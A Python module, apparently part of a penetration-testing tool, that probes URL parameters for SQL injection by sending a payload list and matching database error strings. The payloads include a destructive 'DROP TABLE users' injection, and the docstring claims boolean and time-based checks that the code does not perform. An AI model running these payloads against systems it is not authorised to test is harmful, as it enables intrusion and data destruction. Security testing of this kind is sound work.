"""
SQL Injection Scanner
"""

import re
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from rich.console import Console
from rich.panel import Panel

from redai.core.display import display
from redai.core.utils import suggest_ai_analysis
from redai.database.repository import save_scan


console = Console()

SQL_PAYLOADS = [
    "'", "''", "\"", "1'OR'1'='1", "1 OR 1=1", "' OR '1'='1",
    "admin'--", "1; DROP TABLE users--", "' UNION SELECT NULL--",
    "1' AND '1'='1", "1' AND '1'='2"
]

ERROR_PATTERNS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL result",
    r"MySqlClient\.", r"PostgreSQL.*ERROR", r"Warning.*pg_",
    r"valid PostgreSQL result", r"ORA-\d{5}", r"Oracle error",
    r"Microsoft SQL Server", r"ODBC SQL Server Driver",
    r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite",
    r"sqlite3_prepare", r"sqlite3_query"
]


def sqli(url: str, project: str = "General", auto: bool = False):
    """Esc√°ner de SQL Injection (Error-Based, Boolean & Time-Based)."""
    if not auto:
        display.header(f"SQL Injection Scanner: {url}")
    
    if not url.startswith("http"):
        url = f"http://{url}"
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        display.warning("No parameters found in URL. Add ?param=value")
        return
    
    vulnerable = False
    findings = []
    
    for param in params:
        display.step(f"Testing parameter: {param}")
        
        for payload in SQL_PAYLOADS:
            test_params = params.copy()
            test_params[param] = [payload]
            
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(test_params, doseq=True), parsed.fragment
            ))
            
            try:
                response = requests.get(test_url, timeout=5)
                
                for pattern in ERROR_PATTERNS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        msg = f"üö® VULNERABLE: {param} with payload: {payload}"
                        findings.append(msg)
                        console.print(f"[bold red]{msg}[/bold red]")
                        vulnerable = True
                        break
                        
            except requests.RequestException:
                continue
    
    out = "\n".join(findings) if findings else "‚ùå No SQL Injection found."
    
    if not auto:
        style = "red" if vulnerable else "green"
        console.print(Panel(out, style=style))
    
    suggest_ai_analysis(out, "SQL Injection Scan")
    save_scan(target=url, command_type="sqli", output=out, project_name=project)
